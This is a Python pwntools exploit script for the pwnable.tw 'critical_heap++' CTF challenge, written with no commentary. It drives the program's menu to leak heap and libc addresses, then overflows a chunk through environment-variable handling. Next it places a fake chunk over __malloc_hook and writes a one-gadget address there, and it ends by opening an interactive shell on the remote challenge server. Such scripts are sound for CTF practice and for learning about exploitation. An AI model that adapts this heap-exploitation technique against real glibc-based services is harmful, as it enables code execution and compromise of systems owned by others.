#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import os
os.environ={
    "PWN":"yes",
    "DDAA":"phd",
    "OLDPWD":"/home",
    "LOGNAME":"critical_heap++",
    "XDG_RUNTIME_DIR":"/run/user/1000",
    "LESSOPEN":"| /usr/bin/lesspipe %s",
    "LANG":"en_US",
    "SHLVL":"1",
    "SHELL":"/bin/bash",
    "ID":"1337",
    "HOSTNAME":"pwnable.tw",
    "MAIL":"/var/mail/critical_heap++",
    "HEAP":"fun",
    "FLAG":"/",
    "ROOT":"/",
    "LD_LIBRARY_PATH":"/dbg64/lib",
    "PORT":"4869",
    "X_PORT":"56746",
    "SERVICE":"critical_heap++",
    "XPC_FLAGS":"0x0",
    "TMPDIR":"/tmp",
    "RBENV_SHELL":"bash",
}
context.log_level="debug"
pwn_file="./critical_heap"
libc_file="/dbg64/lib/libc.so.6"
elf=ELF(pwn_file)
libc=ELF(libc_file)
libc_address=0
heap_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chall.pwnable.tw",10500)
    pid=0

def debug():
    log.info("heap address: 0x%x"%heap_address)
    log.info("libc address: 0x%x"%libc_address)
    log.debug("process pid:%d"%pid)
    pause()

def create_heap(name,heap_type,content=None):
    # heap_type 
    # 1. Normal
    # 2. Clock
    # 3. System
    conn.sendlineafter("Your choice : ","1")
    conn.sendafter("Name of heap:",name)
    conn.sendlineafter("Your choice : ",str(heap_type))
    if heap_type !=1:
        return
    else:
        conn.sendafter("Content of heap :",content)

def show_heap(index):
    # only for normal heap
    conn.sendlineafter("Your choice : ","2")
    conn.sendlineafter("Index of heap :",str(index))
    name=conn.recvline()[len("Name : "):-1]
    content=conn.recvline()[len("Content : "):-1]
    return name,content

def change_content(index,content):
    # only for normal heap
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","2")
    conn.sendafter("Content :",content)
    conn.sendlineafter("Your choice : ","3")

def set_env(index,name,value):
    # only for system heap
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","1")
    conn.sendafter("Give me a name for the system heap :",name)
    conn.sendafter("Give me a value for this name :",value)
    conn.sendlineafter("Your choice : ","5")

def unset_env(index,name):
    # only for system heap
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","2")
    conn.sendlineafter("What's name do you want to unset :",name)
    conn.sendlineafter("Your choice : ","5")


def del_heap(index):
    conn.sendlineafter("Your choice : ","5")
    conn.sendlineafter("Index of heap :",str(index))

def overflow(index):
    # only for system
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","3")
    conn.sendlineafter("Your choice : ","5")

def update_time(index):
    # only for clock
    conn.sendlineafter("Your choice : ","4")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendlineafter("Your choice : ","2")
    conn.sendlineafter("Your choice : ","3")
def change_name(index,name):
    conn.sendlineafter("Your choice : ","3")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendafter("Name of heap:",name)

# create fake chunk
create_heap("a"*8,1,"b"*0x28)# 0
create_heap("a\x00",2)#1 clock

# leak heap & libc
change_content(0,"b"*0x28)
name,content=show_heap(0)
heap_address=u64(content[0x30:].ljust(8,"\x00"))-0x30
libc_address=u64(name[8:14].ljust(8,"\x00"))-0xda780

create_heap("a\x00",3)# 2 system
set_env(2,"PWD",".")
set_env(2,"TZ","z"*0x40)
set_env(2,"X"*8,"x"*8)
update_time(1)
create_heap("a"*0xa0,1,"b"*0x28)# 3
create_heap("a"*0xa0,1,"b"*0x28)# 4
set_env(2,"Y"*0x8,"y"*0x8)
set_env(2,"Z"*0x8,"z"*0x8)
create_heap("a\x00",3)# 5
overflow(5)

create_heap("a"*0x80,1,"b"*0x28)# 6
payload="a"*0x48+p64(0x70)+p64(libc_address+libc.symbols["__malloc_hook"]-19)
change_name(6,payload)
create_heap("a"*0x40,3)# 7
create_heap("a"*0x60,3)# 8

payload="a"*0x3+p64(libc_address+0xd5bd7)
create_heap("a"*0x60,1,"b")# 9
change_name(9,payload)
debug()
del_heap(0)
conn.sendlineafter("Your choice : ","1")
conn.sendlineafter("Name of heap:","get shell!")
conn.interactive()










